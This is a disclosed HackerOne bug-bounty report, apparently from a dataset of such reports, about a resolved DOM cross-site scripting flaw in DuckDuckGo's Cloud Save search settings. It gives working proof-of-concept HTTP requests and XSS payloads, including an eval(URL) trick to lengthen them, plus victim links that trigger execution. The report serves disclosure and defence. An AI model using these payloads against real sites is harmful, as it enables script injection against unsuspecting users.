---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '921635'
original_report_id: '921635'
title: DOM XSS on duckduckgo.com search
weakness: Cross-site Scripting (XSS) - DOM
team_handle: duckduckgo
created_at: '2020-07-12T18:07:27.265Z'
disclosed_at: '2020-08-20T15:49:37.725Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 30
asset_identifier: '*.duckduckgo.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM XSS on duckduckgo.com search

## Metadata

- HackerOne Report ID: 921635
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: duckduckgo
- Disclosed At: 2020-08-20T15:49:37.725Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hey there,

there is a DOM XXS vulnerability on the https://duckduckgo.com/ search result page through the `kp` and `kae` parameters of the [Cloud Save](https://help.duckduckgo.com/duckduckgo-help-pages/settings/cloud-save/) feature.

POC URL: https://duckduckgo.com/?q=s&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325

Video (Firefox 78.0.1): 
{F904609}

Video (Chromium 83.0.4103.116): 
{F904637}

## How to reproduce?

First, we need to create malicious "Cloud Save" setting with our XSS payloads, an attacker would do that on their computer, we can do that with the following request to duckduckgo.com:

```
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 248

{
"command":"write",
"objectKey":"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff",
"obj":{
"kp":"\"><img src=/ onerror=alert(1)>",
"kae":"\"><img src=/ onerror=alert(2)>"
}
}
```

Now we just need to visit duckduckgo.com with the key parameter set, an attacker would send this link to the victim, like this: https://duckduckgo.com/?q=a&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff. The Cloud Save key is now saved in the browser's Local Storage. Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching https://duckduckgo.com/?q=a, it even triggers on the settings page https://duckduckgo.com/settings and others.

## What about longer payloads?

You cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great @terjanq 's payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code.

Request to set up Cloud Save:

```
POST /settings.js HTTP/1.1
Host: duckduckgo.com
Content-Length: 211

{
"command":"write",
"objectKey":"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324",
"obj":{
"kp":"\"><svg/onload=eval(`'`+URL)>"
}
}
```

And URL that executes the code: https://duckduckgo.com/?q=s&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#';alert(document.domain);

Video:
{F904653}

## Impact

Attacker can execute JavaScript.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
